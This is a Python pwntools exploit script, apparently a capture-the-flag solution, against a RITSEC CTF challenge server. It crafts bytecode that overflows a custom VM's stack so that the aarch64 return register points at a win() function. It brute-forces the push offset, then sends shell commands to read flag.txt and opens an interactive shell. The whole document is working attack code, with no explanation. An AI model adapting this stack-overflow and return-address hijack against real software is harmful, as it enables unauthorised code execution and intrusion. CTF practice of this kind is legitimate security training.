#!/usr/bin/env python3
from pwn import *

context.arch = 'aarch64'

def try_pushes(n):
    r = remote('marauder-might.ctf.ritsec.club', 1739, level='error')
    r.recvuntil(b'interpreting\n')
    
    # 1. Number of constants
    payload = p32(2)
    
    # 2. Constants array
    payload += p64(0)         # Constant 0: padding
    payload += p64(0x400780)  # Constant 1: win() address
    
    # 3. Bytecode instructions
    for _ in range(n - 1):
        payload += p8(0) + p8(0) # OP_CONSTANT, index 0
    
    payload += p8(0) + p8(1)     # OP_CONSTANT, index 1 (Target x30 overwrite)
    payload += p8(0) + p8(0)     # Dummy value for OP_RETURN to pop
    payload += p8(1)             # OP_RETURN
    
    r.send(payload)
    
    try:
        r.recvline(timeout=2) # Ignore normal OP_RETURN print
        r.sendline(b'echo Pwned; cat flag.txt; id')
        
        out = r.recvline(timeout=2)
        if b'Pwned' in out or b'RS{' in out:
            print(f"\n[+] SUCCESS! The exact stack offset is {n} pushes.")
            print(out.decode())
            r.interactive()
            return True
    except:
        pass
    finally:
        r.close()
    return False

print("[*] Starting brute-force for the VM stack overflow offset...")
for i in range(250, 280):
    print(f"[*] Trying {i} pushes...", end='\r')
    if try_pushes(i):
        break